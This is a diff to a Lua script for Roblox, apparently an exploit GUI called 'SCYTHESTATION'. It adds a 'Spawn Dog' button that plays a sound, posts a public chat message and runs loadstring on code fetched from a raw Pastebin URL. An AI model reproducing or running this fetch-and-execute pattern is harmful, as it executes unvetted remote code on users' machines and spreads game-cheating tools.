@@ -523,7 +523,26 @@ local CreateButton = Page:CreateButton("Reset", "Kills u basically", function(Re
     sound2:Destroy()
     end
 end)
-
+local CreateButton = Page:CreateButton("Spawn Dog", "I cant tell if this is local or not.. also u might need hats 4 dis", function(Dog)
+    getgenv().Dog = Dog
+        task.wait() do
+        local Dog = getgenv().Dog
+        local sound2 = Instance.new("Sound", Workspace)
+        sound2.Parent = game.Workspace
+        sound2.SoundId = "rbxassetid://1862047553"
+        sound2.Volume = 1
+        sound2:Play()
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("cmere puppy! whos a good boy! :3", "All")
+        game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "SCYTHESTATION";
+        Text = "Spawning pet...";
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+        Duration = 3;
+        wait(1)
+        loadstring(game:HttpGet(('https://pastebin.com/raw/sJ103bfb'),true))(); 
+    sound2:Destroy()
+    end
+end)
 game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = "[SCYTHESTATION] Local loaded!", Color = Color3.fromRGB( 255, 3, 125 ), Font = Enum.Font.Arial, FontSize = Enum.FontSize.Size24 } )
 
 -- // SongSinger \\ --
